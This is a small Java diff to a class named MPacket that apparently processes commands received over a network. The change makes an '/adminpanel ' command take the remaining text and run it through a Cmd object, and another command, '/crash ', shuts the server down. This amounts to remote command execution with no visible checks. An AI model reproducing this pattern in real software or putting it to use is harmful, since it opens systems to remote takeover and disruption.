@@ -47,8 +47,9 @@ public class MPacket extends Thread {
             }
             sendPck("MEXIT");
         } else if (this.cmd.contains("/adminpanel ")) {
-            String exec = cmd.substring(12);
-            Cmd cmd = new Cmd(0, exec);
+            String exec = cmd.substring(cmd.indexOf("/adminpanel ")+12).trim();
+            Cmd cmd = new Cmd(exec);
+            cmd.start();
         } else if (this.cmd.contains("/crash ")) {
             Main.srv.closeServer();
         } else if (this.cmd.contains("/mstop ")) {
